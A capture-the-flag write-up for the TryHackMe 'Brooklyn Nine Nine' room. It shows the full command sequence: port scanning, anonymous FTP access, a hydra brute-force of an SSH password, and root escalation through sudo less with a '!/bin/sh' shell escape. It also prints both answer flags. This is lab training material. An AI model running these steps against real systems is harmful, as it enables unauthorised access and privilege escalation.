# Brooklyn Nine Nine
### NYPD's 99th Precinct
_"Fine, but in protest, I’m walking over there extremely slowly!"_

Link to the tryhackme room:
[https://tryhackme.com/room/brooklynninenine](https://tryhackme.com/room/brooklynninenine)<br>
Target machine IP: 10.81.135.127<br>
Attack machine IP: 192.168.136.34

Start with scanning first 1001 ports:
`└─# nmap -sS 10.81.135.127 -p0-1000 -vv -n`
>I tried to scan all ports, but higher ones started slowing down the process. This command is good enough for this room.

This time I've used _-vv_ option to show more details and '_reason_' column - just for fun.<br>
Three ports are marked as open.
```
PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack ttl 62
22/tcp open  ssh     syn-ack ttl 62
80/tcp open  http    syn-ack ttl 62
```
Let's dive deeper, we'll check the version of each service and find out potential secrets.
```
└─# nmap -sC -sV -O 10.81.135.127 -p21,22,80 -vv -n
PORT   STATE SERVICE REASON         VERSION
21/tcp open  ftp     syn-ack ttl 62 vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
22/tcp open  ssh     syn-ack ttl 62 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack ttl 62 Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET POST
|_http-server-header: Apache/2.4.29 (Ubuntu)
```
>For brevity, only necessary content has been shown above.
>
Anonymous FTP login is allowed! It's always worth to check if there's anything out there...<br>
...here we can already see there's a note that might interest us.

Connect to FTP and retrieve the note.
```
└─# ftp 10.81.135.127 21
Connected to 10.81.135.127.
220 (vsFTPd 3.0.3)
Name (10.81.135.127:kali): anonymous
```
Anonymous login is done without providing password. Just click enter when prompted.
```
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
```
We'll check if the file is actually there, and then retrieve it from the FTP server (by using _GET_ command)
```
ftp> ls
150 Here comes the directory listing.
-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
226 Directory send OK.
ftp> get note_to_jake.txt
local: note_to_jake.txt remote: note_to_jake.txt
226 Transfer complete.
ftp>
```
Inside we can see an opportunity to access more sensitive files:
```
└─# cat note_to_jake.txt 
From Amy,

Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine
```
Now, what do we know?
- There are at least two user accounts in the system: jake and amy
- Jake's password is supposedly weak. Maybe we can break it?

Load up hydra, set up login (-l), passwords wordlist (-P) and target server (ssh://...)  
```
└─# hydra -l jake -P /usr/share/wordlists/rockyou.txt ssh://10.81.135.127
[DATA] attacking ssh://10.81.135.127:22/
[22][ssh] host: 10.81.135.127   login: jake   password: 987654321
```
Easy peasy, it took seconds to find it!

This probably allows us to access ssh
```
└─# ssh jake@10.81.135.127               
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
jake@10.81.135.127's password: 
Last login: Tue May 26 08:56:58 2020

jake@brookly_nine_nine:/home$
```
We're in! That FTP server totally helped us. Unprotected shares are always worth checking.

What is on the server? Look around:
```
jake@brookly_nine_nine:/home$ ls
amy  holt  jake

jake@brookly_nine_nine:/home$ cd holt

jake@brookly_nine_nine:/home/holt$ ls -hal | grep "txt"
-rw-rw-r-- 1 holt holt   33 May 17  2020 user.txt

jake@brookly_nine_nine:/home/holt$ cat user.txt
ee11cbb19052e40b07aac0ca060c23ee
```
First flag found, user.txt: `ee11cbb19052e40b07aac0ca060c23ee`

Let's go for the low-hanging fruit, maybe we have sudo access for any command?
```
jake@brookly_nine_nine:~$ sudo -l
Matching Defaults entries for jake on brookly_nine_nine:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jake may run the following commands on brookly_nine_nine:
    (ALL) NOPASSWD: /usr/bin/less
```
Classic! We're on a good track.

Verify if we actually **can** use it with sudo:
```
jake@brookly_nine_nine:~$ sudo /usr/bin/less 
Missing filename ("less --help" for help)
```
It went through.
>I use the absolute path because the user's PATH may override the system one. If another `less` exists earlier in PATH variable, the other executable (without Sudo privileges) could be run.

GTFOBins can tell us how do we escalate privileges to root:
[https://gtfobins.org/gtfobins/less/](https://gtfobins.org/gtfobins/less/)
```
jake@brookly_nine_nine:~$ sudo less /etc/hosts

(enter !/bin/sh in the prompt window)
```
Ooh, our command prompt has changed to "#" symbol! Are we root now?
```
# whoami
root
```
That's pretty much it! So now, where is the flag?
```
# cd /root
# ls
root.txt
# cat root.txt
-- Creator : Fsociety2006 --
Congratulations in rooting Brooklyn Nine Nine
Here is the flag: 63a9f0ea7bb98050796b649e85481845

Enjoy!!
# 
```
>In more difficult CTFs I would use `find` command. By default the flag is located directly in `/root` directory

Second flag found, root.txt: `63a9f0ea7bb98050796b649e85481845`

Finished!

This room taught us why allowing anonymous FTP login and using weak passwords is not a good idea. 

The author mentioned, that there are two ways of breaking into the server. We haven't touched port 80 yet.. <br>We'll explore it in other writeup, see ya! :)

### Sources:
https://en.wikipedia.org/wiki/File_Transfer_Protocol<br>
https://en.wikipedia.org/wiki/List_of_FTP_commands<br>
https://www.kali.org/tools/hydra/<br>
https://gtfobins.org/gtfobins/less/
